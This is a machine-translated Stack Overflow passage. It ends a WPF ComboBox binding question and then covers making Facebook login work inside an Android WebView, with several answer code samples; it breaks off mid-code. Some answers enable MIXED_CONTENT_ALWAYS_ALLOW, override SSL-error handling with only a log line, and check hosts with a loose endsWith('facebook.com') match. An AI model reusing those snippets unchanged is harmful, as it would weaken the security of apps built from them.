System.Windows.Data Warning: 78 : BindingExpression (hash=45045097): TransferValue - got raw value CameraViewInfo (hash=49590542)
System.Windows.Data Warning: 80 : BindingExpression (hash=45045097): TransferValue - user's converter produced CameraViewInfo (hash=49590542)
System.Windows.Data Warning: 87 : BindingExpression (hash=45045097): TransferValue - using final value CameraViewInfo (hash=49590542) 
```

使用 DID 更新选择框的列表视图切换节点后：

```
System.Windows.Data Warning: 99 : BindingExpression (hash=51217614): GetValue at level 0 from ConfigurationWindow (hash=63245828) using RuntimePropertyInfo(CurrentNode): OTNode (hash=8023662)
System.Windows.Data Warning: 99 : BindingExpression (hash=51217614): GetValue at level 0 from ConfigurationWindow (hash=63245828) using RuntimePropertyInfo(CurrentNode): OTNode (hash=8023662)
System.Windows.Data Warning: 106 : BindingExpression (hash=51217614):   At level 1 - for OTNode.NodeInfo found accessor ReflectPropertyDescriptor(NodeInfo)
System.Windows.Data Warning: 102 : BindingExpression (hash=51217614): Replace item at level 1 with OTNode (hash=8023662), using accessor ReflectPropertyDescriptor(NodeInfo)
System.Windows.Data Warning: 99 : BindingExpression (hash=51217614): GetValue at level 1 from OTNode (hash=8023662) using ReflectPropertyDescriptor(NodeInfo): OTNodeInfo (hash=21425964)
System.Windows.Data Warning: 106 : BindingExpression (hash=51217614):   At level 2 - for OTNodeInfo.Camera1 found accessor ReflectPropertyDescriptor(Camera1)
System.Windows.Data Warning: 102 : BindingExpression (hash=51217614): Replace item at level 2 with OTNodeInfo (hash=21425964), using accessor ReflectPropertyDescriptor(Camera1)
System.Windows.Data Warning: 99 : BindingExpression (hash=51217614): GetValue at level 2 from OTNodeInfo (hash=21425964) using ReflectPropertyDescriptor(Camera1): CameraViewInfo (hash=6049320)
System.Windows.Data Warning: 78 : BindingExpression (hash=51217614): TransferValue - got raw value CameraViewInfo (hash=6049320)
System.Windows.Data Warning: 80 : BindingExpression (hash=51217614): TransferValue - user's converter produced CameraViewInfo (hash=6049320)
System.Windows.Data Warning: 87 : BindingExpression (hash=51217614): TransferValue - using final value CameraViewInfo (hash=6049320) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T01:45:00.747

我认为您的问题在于您绑定到的方式`SelectedItem`：

```
<ComboBox ...
    SelectedItem="{Binding Path=CurrentNode.NodeInfo.Camera1, 
        Converter={StaticResource EnsureBlank}, Mode=TwoWay}"  ... 
```

如果内存服务正确，`SelectedItem`一个属性（`Text`是另一个）（默认情况下）仅在失去焦点时推送更新。

添加`UpdateSourceTrigger="PropertyChanged"`到绑定以强制更新更频繁地发生。你不应该需要你的活动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-03T13:31:34.760

好的，所以我最终完全摆脱了数据绑定，并使用了一个非常 winforms 风格的事件模型来更新我的数据。我仍然无法弄清楚为什么数据绑定不起作用，如果有人有使用数据绑定的解决方案，我会接受它作为答案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T09:51:04.627

您的转换器会创建一个新对象，而 ItemTemplate 的 TextBlock 中的文本仍绑定到原始对象。因此，很明显，当您更改新对象的 Name 属性时，它不会改变。

# javascript - 使 facebook 登录与 Android Webview 一起工作

> ID：12648099
> 
> 赞同：35
> 
> 时间：2012-09-28T22:20:08.607
> 
> 标签：javascript, android, facebook, webview

我只是想在 Android 的 WebView 上实现 facebook 登录。问题是在我单击 HTML 页面上的 facebook 按钮并在 Facebook 对话框中插入用户名和密码之后。url 重定向只是给了我一个黑页。

```
 @Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    WebView webview = new WebView(this);        
    webview.setWebChromeClient(new WebChromeClient());  
    webview.getSettings().setPluginState(PluginState.ON);
    webview.getSettings().setJavaScriptEnabled(true); 
    webview.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
    webview.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
    webview.setWebViewClient(new WebViewClient());
    webview.loadUrl("http://peoplehunt.crowdscanner.com/hunt"); 
    setContentView(webview); 
```

这是我的 HTML 页面上的 Facebook 常规 javascript API，当单击 facebook 按钮时会调用此函数。

```
$("#login_facebook").click(function() {

                    FB.login(function(response) {
                            //This function should be called
                            if (response.authResponse) {
                            FB.api('/me?fields=name,email,picture,id&type=large', function(response) {
                                    //console.log("email "+response.email);
                                    $("#submitHandle").hide();
                                    $("#loader").show();
                                    //console.log('Good to see you, ' + response.picture + '.');
                                    var theUsername = response.name;
                                    theUsername = theUsername.replace(/ /g, '_')+"_"+response.id+"@meetforeal.com";
                                    //console.log(theUsername);
                                    $("input[name=email]").val(encodeURIComponent(response.email));
                                    $("input[name=lastName]").val(encodeURIComponent(response.name));
                                    $("input[name=avatarImage]").val(response.picture);
                                    $("input[name=userName]").val(encodeURIComponent(theUsername));
                                    $("#msg_twitter").fadeIn("slow");
                                    $("#submitHandle").show();
                                    $("#loader").hide();
                                    $("#user").attr("action","/crowdmodule/auth/registerattendeefacebook");
                                    $("#user").submit();
                            });
                            } else {
  //console.log('User cancelled login or did not fully authorize.');
 }
}, {scope: 'email'}); 
```

关于如何在 Facebook 对话页面上重定向后获取响应的任何想法？谢谢。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2013-09-28T14:37:48.080

我在我的 android 应用程序上遇到了同样的问题。问题的原因是 FB 登录 javascript 在新窗口中打开新页面。然后它尝试关闭它并在登录成功后发送一些 javascript 身份验证代码。WebView 通常是“仅单个窗口”，因此它没有地方可以返回，因此是空白屏幕。

请按照我的工作代码中的流动示例进行操作。

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="#0099cc"
tools:context=".MyActivity" 
android:id="@+id/webview_frame">

<WebView
    android:id="@+id/webview"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
/> 
```

id "webview" 的 Webview 是我的内容的主要视图。以下是我的活动代码。

```
public class MyActivity extends Activity {

/* URL saved to be loaded after fb login */
private static final String target_url="http://www.example.com";
private static final String target_url_prefix="www.example.com";
private Context mContext;
private WebView mWebview;
private WebView mWebviewPop;
private FrameLayout mContainer;
private long mLastBackPressTime = 0;
private Toast mToast;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.activity_urimalo);
    // final View controlsView =
    // findViewById(R.id.fullscreen_content_controls);
    CookieManager cookieManager = CookieManager.getInstance(); 
    cookieManager.setAcceptCookie(true); 
    mWebview = (WebView) findViewById(R.id.webview);
    //mWebviewPop = (WebView) findViewById(R.id.webviewPop);
    mContainer = (FrameLayout) findViewById(R.id.webview_frame);
    WebSettings webSettings = mWebview.getSettings();
    webSettings.setJavaScriptEnabled(true);
    webSettings.setAppCacheEnabled(true);
    webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
    webSettings.setSupportMultipleWindows(true);
    mWebview.setWebViewClient(new UriWebViewClient());
    mWebview.setWebChromeClient(new UriChromeClient());
    mWebview.loadUrl(target_url);

    mContext=this.getApplicationContext();

}

private class UriWebViewClient extends WebViewClient {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        String host = Uri.parse(url).getHost();
        //Log.d("shouldOverrideUrlLoading", url);
        if (host.equals(target_url_prefix)) 
        {
            // This is my web site, so do not override; let my WebView load
            // the page
            if(mWebviewPop!=null)
            {
                mWebviewPop.setVisibility(View.GONE);
                mContainer.removeView(mWebviewPop);
                mWebviewPop=null;
            }
            return false;
        }

        if(host.equals("m.facebook.com"))
        {
            return false;
        }
        // Otherwise, the link is not for a page on my site, so launch
        // another Activity that handles URLs
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        startActivity(intent);
        return true;
    }

    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler,
            SslError error) {
        Log.d("onReceivedSslError", "onReceivedSslError");
        //super.onReceivedSslError(view, handler, error);
    }
}

class UriChromeClient extends WebChromeClient {

    @Override
    public boolean onCreateWindow(WebView view, boolean isDialog,
            boolean isUserGesture, Message resultMsg) {
        mWebviewPop = new WebView(mContext);
        mWebviewPop.setVerticalScrollBarEnabled(false);
        mWebviewPop.setHorizontalScrollBarEnabled(false);
        mWebviewPop.setWebViewClient(new UriWebViewClient());
        mWebviewPop.getSettings().setJavaScriptEnabled(true);
        mWebviewPop.getSettings().setSavePassword(false);
        mWebviewPop.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT));
        mContainer.addView(mWebviewPop);
        WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
        transport.setWebView(mWebviewPop);
        resultMsg.sendToTarget();

        return true;
    }

    @Override
    public void onCloseWindow(WebView window) {
        Log.d("onCloseWindow", "called");
    }

}
} 
```

这个问题的关键是onCreateWindow。创建一个新窗口并将其插入到框架布局中，并在成功时将其删除。我在 shouldOverrideUrlLoading 添加了删除。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-12-21T18:42:57.110

这是一个示例 Android 项目： [Github：Android_Popup_Webview_handler_example](https://github.com/hwasiti/Android_Popup_Webview_handler_example)

这是一个 Android Studio 项目，展示了如何在 Android Webview 中处理弹出窗口。大多数开源浏览器不支持打开弹出窗口。

[弹出窗口在许多网站（例如www.feedly.com](http://www.feedly.com)）中使用的 OAuth 登录中尤为重要。此项目中的弹出窗口在对话框中打开，可以通过关闭按钮或按 Back 或如果弹出窗口自行关闭（就像大多数登录身份验证流程中发生的情况一样）关闭。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-01-05T12:47:57.410

关于[这个问题](https://stackoverflow.com/q/20965285/2419808)[的最佳答案](https://stackoverflow.com/a/20979409/2419808)，您只需要实现您使用的 WebViewClient 类的 onPageFinished 方法。

```
public void onPageFinished(WebView view, String url) {
    // First, get the URL that Facebook's login button is actually redirecting you to.
    // It should be something simulator to https://www.facebook.com/dialog/return/arbiter?relation=opener&close=true
    String webUrl = webView.getUrl();
    // Pass it to the LogCat so that you can then use it in the if statement below.
    Log.d.println(TAG, webUrl);

    if (url.startsWith("The url that you copied from the LogCat")) {
        // Check whether the current URL is the URL that Facebook's redirecting you to.
        // If it is - that's it - do what you want to after the logging process has finished.
        return;
    }

    super.onPageFinished(view, url);
} 
```

它对我来说很好。希望它也能帮助你:)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-24T18:29:26.537

覆盖`shouldOverrideUrlLoading()`你的`WebViewClient`. `shouldOverrideUrlLoading` [在这里](http://developer.android.com/guide/webapps/webview.html)搜索。此外，还有一个参数可以传递给 facebook 的登录 API；我认为它是redirect_uri。这应该可以帮助您识别登录成功的时间，并且在您的 中`shouldOVerrideUrlLoading()`，您只需要检测正在加载的 url，如果它是您指定的 redirect_uri，则只需在该方法中返回 true 并关闭 webview 或任何您想要的时间登录成功。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-04-16T02:33:23.020

我的回答与这里的其他人基本相似，因为我创建了第二个`WebView`来托管 Facebook 登录页面，而不是尝试通过重定向来解决问题。但是，我选择将登录`WebView`放在它自己的`Fragment`，并给它自己的专用`WebViewClient`和`WebChromeClient`子类。我认为这可以更容易地了解每个组件所扮演的角色，以及哪些对象需要哪些设置和行为。

我还利用它`WebChromeClient.onCloseWindow()`来检测 Facebook 的 JavaScript 何时想要关闭登录窗口。从不同的答案来看，这比我最初采用的方法要强大得多。

在您的`Activity`布局中，您将拥有`WebView`承载评论的 "primary" 和用于`FacebookWebLoginFragment`. 登录`Fragment`是在需要时即时创建的，然后在 Facebook 的登录 JavaScript 请求关闭其窗口时删除。

我的`Activity`布局如下所示：

```
<include layout="@layout/toolbar_common" />

<FrameLayout
    android:id="@+id/main_layout"
    android:layout_width="match_parent"
    android:layout_height="match_parent">
    <FrameLayout
        android:id="@+id/web_view_fragment_container"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:overScrollMode="never"
        />
    <!-- Used for Facebook login associated with comments -->
    <FrameLayout
        android:id="@+id/facebook_web_login_fragment_container"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:overScrollMode="never"
        android:visibility="gone"
        />
</FrameLayout> 
```

在您的`Activity`中，您需要代码来显示和隐藏 Facebook 网络登录片段。我使用 Otto 事件总线，所以我有如下事件处理程序。（这里没有具体针对这个问题；我包含此代码只是为了让您了解登录如何`Fragment`融入整体结构。）

```
@Subscribe
public void onShowFacebookWebLoginEvent(ShowFacebookWebLoginEvent event) {
    FacebookWebLoginFragment existingFragment = getFacebookWebLoginFragment();
    if (existingFragment == null) {
        mFacebookWebLoginFragmentContainer.setVisibility(View.VISIBLE);
        createFacebookWebLoginFragment(event);
    }
}

@Subscribe
public void onHideFacebookWebLoginEvent(HideFacebookWebLoginEvent event) {
    FacebookWebLoginFragment existingFragment = getFacebookWebLoginFragment();
    if (existingFragment != null) {
        mFacebookWebLoginFragmentContainer.setVisibility(View.GONE);
        FragmentManager fm = getSupportFragmentManager();
        fm.beginTransaction()
                .remove(existingFragment)
                .commit();
    }
}

@Nullable
private FacebookWebLoginFragment getFacebookWebLoginFragment() {
    FragmentManager fm = getSupportFragmentManager();
    return (FacebookWebLoginFragment) fm.findFragmentById(R.id.facebook_web_login_fragment_container);
}

private void createFacebookWebLoginFragment(ShowFacebookWebLoginEvent event) {
    FragmentManager fm = getSupportFragmentManager();
    FacebookWebLoginFragment fragment = (FacebookWebLoginFragment) fm.findFragmentById(R.id.facebook_web_login_fragment_container);
    if (fragment == null) {
        fragment = FacebookWebLoginFragment.newInstance(event.getOnCreateWindowResultMessage());
        fm.beginTransaction()
                .add(R.id.facebook_web_login_fragment_container, fragment)
                .commit();
    }
} 
```

当`FacebookWebLoginFragment`它存在时，它应该被授予处理设备后退按钮按下的权限。这很重要，因为 Facebook 登录流程包含离开登录页面的导航功能，并且用户希望返回按钮返回登录。所以，在我的`Activity`，我有这个：

```
@Override
public void onBackPressed() {
    boolean handled = false;
    FacebookWebLoginFragment facebookWebLoginFragment = getFacebookWebLoginFragment();
    if (facebookWebLoginFragment != null) {
        handled = facebookWebLoginFragment.onBackPressed();
    }
    if (!handled) {
        WebViewFragment fragment = getWebViewFragment();
        if (fragment != null) {
            handled = fragment.onBackPressed();
        }
    }
    if (!handled) {
        finish();
    }
} 
```

的布局`FacebookWebLoginFragment`非常简单：

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
             android:layout_width="match_parent"
             android:layout_height="match_parent">
    <WebView
        android:id="@+id/web_view"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        />
</FrameLayout> 
```

这是`FacebookWebLoginFragment`代码。请注意，它依赖于一个子类`WebChromeClient`来检测 Facebook 登录 JavaScript 何时准备好关闭窗口（即，删除片段）。另请注意，此登录名与包含评论 UI`WebView`的主节点之间没有直接通信；`WebView`身份验证令牌通过第三方 cookie 传递，这就是为什么您必须确保在您的主`WebView`.

```
import android.graphics.Bitmap;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Bundle;
import android.os.Message;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import butterknife.Bind;
import butterknife.ButterKnife;

/**
 * Hosts WebView used by Facebook web login.
 */
public class FacebookWebLoginFragment extends BaseFragment {
    private static final String LOGTAG = LogHelper.getLogTag(FacebookWebLoginFragment.class);

    @Bind(R.id.web_view) WebView mFacebookLoginWebView;

    private WebChromeClient mFacebookLoginWebChromeClient;
    private Message onCreateWindowResultMessage;

    public static FacebookWebLoginFragment newInstance(Message onCreateWindowResultMessage) {
        FacebookWebLoginFragment fragment = new FacebookWebLoginFragment();
        fragment.onCreateWindowResultMessage = onCreateWindowResultMessage;
        return fragment;
    }

    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View rootView = inflater.inflate(R.layout.frag_facebook_web_login, container, false);
        ButterKnife.bind(this, rootView);
        return rootView;
    }

    @Override
    public void onViewCreated(View v, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(v, savedInstanceState);

        mFacebookLoginWebView.setVerticalScrollBarEnabled(false);
        mFacebookLoginWebView.setHorizontalScrollBarEnabled(false);
        mFacebookLoginWebView.setWebViewClient(new FacebookLoginWebViewClient());
        mFacebookLoginWebView.getSettings().setJavaScriptEnabled(true);
        mFacebookLoginWebView.getSettings().setSavePassword(false);
        mFacebookLoginWebView.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT));

        mFacebookLoginWebChromeClient = makeFacebookLoginWebChromeClient();
        mFacebookLoginWebView.setWebChromeClient(mFacebookLoginWebChromeClient);

        WebView.WebViewTransport transport = (WebView.WebViewTransport) onCreateWindowResultMessage.obj;
        transport.setWebView(mFacebookLoginWebView);
        onCreateWindowResultMessage.sendToTarget();
        onCreateWindowResultMessage = null; // This seems to eliminate a mysterious crash
    }

    @Override
    public void onDestroy() {
        mFacebookLoginWebChromeClient = null;
        super.onDestroy();
    }

    /**
     * Performs fragment-specific behavior for back button, and returns true if the back press
     * has been fully handled.
     */
    public boolean onBackPressed() {
            if (mFacebookLoginWebView.canGoBack()) {
                mFacebookLoginWebView.goBack();
            } else {
                closeThisFragment();
            }
            return true;
    }

    private void closeThisFragment() {
        EventBusHelper.post(new HideFacebookWebLoginEvent());
    }

    class FacebookLoginWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            // Only allow content from Facebook
            Uri uri = Uri.parse(url);
            String scheme = uri.getScheme();
            if (scheme != null && (TextUtils.equals(scheme, "http") || TextUtils.equals(scheme, "https"))) {
                if (UriHelper.isFacebookHost(uri)) {
                    return false;
                }
            }
            return true;
        }
    }

    private WebChromeClient makeFacebookLoginWebChromeClient() {
        return new WebChromeClient() {
            @Override
            public void onCloseWindow(WebView window) {
                closeThisFragment();
            }
        };
    }
} 
```

现在，最棘手的一点是对现有`WebView`的 .

首先，确保您启用了 JavaScript，并且它支持多个窗口。

```
WebSettings webSettings = mWebView.getSettings();
webSettings.setJavaScriptEnabled(true);
webSettings.setSupportMultipleWindows(true); 
```

你*不需要*打电话`setJavaScriptCanOpenWindowsAutomatically(true)`。

查看其他一些答案，您可能认为您需要对`WebViewClient`分配给您的`WebView`, 和 override进行猴子处理`shouldOverrideUrlLoading()`。这不是必需的。重要的是`WebChromeClient`，它需要覆盖`onCreateWindow()`。

所以...接下来，`WebChromeClient`为您分配一个自定义子类`WebView`：

```
mWebView.setWebChromeClient(new WebChromeClient() {
    @Override
    public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
        String url = null;
        Message href = view.getHandler().obtainMessage();
        if (href != null) {
            view.requestFocusNodeHref(href);
            url = href.getData().getString("url");
        }
        LogHelper.d(LOGTAG, "onCreateWindow: " + url);

        // Unfortunately, url is null when "Log In to Post" button is pressed
        if (url == null || UriHelper.isFacebookHost(Uri.parse(url))) {
            // Facebook login requires cookies to be enabled, and on more recent versions
            // of Android, it's also necessary to enable acceptance of 3rd-party cookies
            // on the WebView that hosts Facebook comments
            CookieHelper.setAcceptThirdPartyCookies(mWebView, true);

            EventBusHelper.post(new ShowFacebookWebLoginEvent(resultMsg));
        } else {
            LogHelper.d(LOGTAG, "Ignoring request from js to open new window for URL: " + url);
        }
        return true;
    }
}); 
```

您会注意到这是第二次调用`UriHelper.isFacebookHost()`. 我没有确定这一点的万无一失的方法，但这就是我所做的：

```
public static boolean isFacebookHost(Uri uri) {
    if (uri != null && !TextUtils.isEmpty(uri.getHost())) {
        String host = uri.getHost().toLowerCase();
        return host.endsWith("facebook.com") || host.endsWith("facebook.net");
    }
    return false;
} 
```

您还会注意到对 的调用`CookieHelper.setAcceptThirdPartyCookies()`。这是代码：

```
public static void setAcceptThirdPartyCookies(WebView webView, boolean accept) {
    CookieManager cookieManager = CookieManager.getInstance();

    // This is a safeguard, in case you've disabled cookies elsewhere
    if (accept && !cookieManager.acceptCookie()) {
        cookieManager.setAcceptCookie(true);
    }
    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.setAcceptThirdPartyCookies(webView, accept);
    }
} 
```

让一些人感到困惑的另一件事是 Facebook 开发设置中“有效 OAuth 重定向 URI”的配置。如果您在日志中看到这样的错误：

> URL 被阻止：此重定向失败，因为重定向 URI 未在应用的客户端 OAuth 设置中列入白名单。确保客户端和 Web OAuth 登录已打开，并将所有应用程序域添加为有效 OAuth 重定向 URI。

...然后你会想看看这个答案：[https ://stackoverflow.com/a/37009374](https://stackoverflow.com/a/37009374)

玩得开心！一个看似非常简单的问题的复杂解决方案。积极的一面是，Android 为开发人员提供了大量的控制权。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-08-14T12:15:27.523

上面的答案太旧了，它不适用于最新的 Facebook sdk 2.7 版。在花了 4 个小时之后，我发现它的一些变化。以下代码适用于最新的 SDK。

下面提到的是 XML 布局文件。

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="#0099cc"
tools:context=".MainActivity"
android:id="@+id/webview_frame">

<WebView
    android:id="@+id/webView"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    />

</FrameLayout> 
```

这是 Android 活动代码片段

```
 public class MainActivity extends AppCompatActivity {

    private WebView webView;
    private WebView mWebviewPop;
    private FrameLayout mContainer;
    private Context mContext;

    private String url = "https://www.YourWebsiteAddress.com";
    private String target_url_prefix = "www.YourWebsiteAddress.com";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //Get outer container
        mContainer = (FrameLayout) findViewById(R.id.webview_frame);

        webView = (WebView)findViewById(R.id.webView);

        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAppCacheEnabled(true);
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        webSettings.setSupportMultipleWindows(true);

        //These two lines are specific for my need. These are not necessary
        if (Build.VERSION.SDK_INT >= 21) {
            webSettings.setMixedContentMode( WebSettings.MIXED_CONTENT_ALWAYS_ALLOW );
        }

        //Cookie manager for the webview
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);

        webView.setWebViewClient(new MyCustomWebViewClient());
        webView.setWebChromeClient(new UriWebChromeClient());
        webView.loadUrl("https://www.YourWebsiteAddress.com");

        mContext=this.getApplicationContext();
    }

    @Override
    public void onBackPressed() {
        if(webView.isFocused() && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

private class MyCustomWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            String host = Uri.parse(url).getHost();

            if( url.startsWith("http:") || url.startsWith("https:") ) {

                if(Uri.parse(url).getPath().equals("/connection-compte.html")) {
                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.YourWebsiteAddress.com"));
                    startActivity(browserIntent);

                    return true ;
                }

                if (host.equals(target_url_prefix)) {
                    if (mWebviewPop != null) {
                        mWebviewPop.setVisibility(View.GONE);
                        mContainer.removeView(mWebviewPop);
                        mWebviewPop = null;
                    }
                    return false;
                }
                if (host.equals("m.facebook.com") || host.equals("www.facebook.com") || host.equals("facebook.com")) {
                    return false;
                }
                // Otherwise, the link is not for a page on my site, so launch
                // another Activity that handles URLs
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                startActivity(intent);
                return true;
            }
            // Otherwise allow the OS to handle it
            else if (url.startsWith("tel:")) {
                Intent tel = new Intent(Intent.ACTION_DIAL, Uri.parse(url));
                startActivity(tel);
                return true;
            }
            //This is again specific for my website
            else if (url.startsWith("mailto:")) {
                Intent mail = new Intent(Intent.ACTION_SEND);
                mail.setType("application/octet-stream");
                String AdressMail = new String(url.replace("mailto:" , "")) ;
                mail.putExtra(Intent.EXTRA_EMAIL, new String[]{ AdressMail });
                mail.putExtra(Intent.EXTRA_SUBJECT, "");
                mail.putExtra(Intent.EXTRA_TEXT, "");
                startActivity(mail);
                return true;
            }
            return true;
        }

        @Override
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
            Log.d("onReceivedSslError", "onReceivedSslError");
            //super.onReceivedSslError(view, handler, error);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            if(url.startsWith("https://m.facebook.com/v2.7/dialog/oauth")){
                if(mWebviewPop!=null)
                {
                    mWebviewPop.setVisibility(View.GONE);
                    mContainer.removeView(mWebviewPop);
                    mWebviewPop=null;
                }
                view.loadUrl("https://www.YourWebsiteAddress.com");
                return;
            }
            super.onPageFinished(view, url);
        }
    }

private class UriWebChromeClient extends WebChromeClient {

        @Override
        public boolean onCreateWindow(WebView view, boolean isDialog,
                                      boolean isUserGesture, Message resultMsg) {
            mWebviewPop = new WebView(mContext);
            mWebviewPop.setVerticalScrollBarEnabled(false);
            mWebviewPop.setHorizontalScrollBarEnabled(false);
            mWebviewPop.setWebViewClient(new MyCustomWebViewClient());
            mWebviewPop.getSettings().setJavaScriptEnabled(true);
            mWebviewPop.getSettings().setSavePassword(false);
            mWebviewPop.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT));
            mContainer.addView(mWebviewPop);
            WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
            transport.setWebView(mWebviewPop);
            resultMsg.sendToTarget();

            return true;
        }

        @Override
        public void onCloseWindow(WebView window) {
            Log.d("onCloseWindow", "called");
        }

    }

} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-06-06T23:02:07.673

这段代码对我有用！我的页面上有一个 LIKE、SHARE、Comments 按钮。

```
 private lateinit var myWebView: WebView;
private val target_url = "https://www.webkomph.com"
private val target_url_prefix = "webkomph.com"
private var mContext: Context? = null
private var mWebviewPop: WebView? = null
private var mContainer: ConstraintLayout? = null
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.activity_main);
    val cookieManager = CookieManager.getInstance();
    cookieManager.setAcceptCookie(true)

    myWebView  = findViewById(R.id.webkom_site);
    mContainer = findViewById(R.id.webview_frame);
    val webkomBlue = Color.parseColor("#1c71bc")
    myWebView.setBackgroundColor(webkomBlue);
    myWebView.background
    val webSettings = myWebView.settings;
    webSettings.setJavaScriptEnabled(true);
    webSettings.setAppCacheEnabled(true);
    webSettings.javaScriptCanOpenWindowsAutomatically = true;
    webSettings.setSupportMultipleWindows(true)
    myWebView.setWebViewClient(UriWebViewClient())
    myWebView.setWebChromeClient(UriChromeClient())
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.setAcceptThirdPartyCookies(myWebView, true)
    }
    myWebView.loadUrl(target_url);
    mContext = this.applicationContext
}

override fun onBackPressed() {
    if (myWebView.canGoBack()) {
        myWebView.goBack()
    } else {
        super.onBackPressed()
    }
}

inner class UriWebViewClient : WebViewClient() {
    override fun shouldOverrideUrlLoading(
        view: WebView,
        url: String
    ): Boolean {
        val host = Uri.parse(url).host
        //Log.d("shouldOverrideUrlLoading", url);
        if(host == null || host == target_url_prefix) {
            // This is my web site, so do not override; let my WebView load
            // the page
            if (mWebviewPop != null) {
                mWebviewPop!!.setVisibility(View.GONE)
                mContainer?.removeView(mWebviewPop)
                mWebviewPop = null
            }
            return false
        }

        if (host == "m.facebook.com" || host == "www.facebook.com" || url.contains("ret=login")) {
            return false
        }
        // Otherwise, the link is not for a page on my site, so launch
        // another Activity that handles URLs
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
        startActivity(intent)
        return true
    }

    override fun onPageFinished(view: WebView?, url: String) {
        // Facebook redirects to this url once a user has logged in, this is a blank page so we override this
        // http://www.facebook.com/connect/connect_to_external_page_widget_loggedin.php?............
        if (url.contains("plugins/close_popup.php?reload") || url.contains("dialog/close_window") || url.contains("facebook.com/dialog/plugin.optin?")) {

            if(mWebviewPop != null){
                mWebviewPop!!.visibility = View.GONE
                mContainer!!.removeView(mWebviewPop)
                mWebviewPop = null
                if(myWebView != null && (url.contains("dialog/close_window") || url.contains("facebook.com/dialog/plugin.optin?"))){
                    myWebView?.reload();
                }
            }

            return
        }
        super.onPageFinished(view, url)
    }
    override fun onReceivedSslError(
        view: WebView, handler: SslErrorHandler,
        error: SslError
    ) {
        Log.d("onReceivedSslError", "onReceivedSslError")
        //super.onReceivedSslError(view, handler, error);
    }
}

inner class UriChromeClient : WebChromeClient() {
    override fun onCreateWindow(
        view: WebView, isDialog: Boolean,
        isUserGesture: Boolean, resultMsg: Message
    ): Boolean {
        mWebviewPop = WebView(mContext)
        mWebviewPop!!.setVerticalScrollBarEnabled(false)
        mWebviewPop!!.setHorizontalScrollBarEnabled(false)
        mWebviewPop!!.setWebViewClient(UriWebViewClient())
        mWebviewPop!!.getSettings().setJavaScriptEnabled(true)
        mWebviewPop!!.getSettings().setSavePassword(false)
        mWebviewPop!!.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )
        mContainer?.addView(mWebviewPop)
        val transport = resultMsg.obj as WebViewTransport
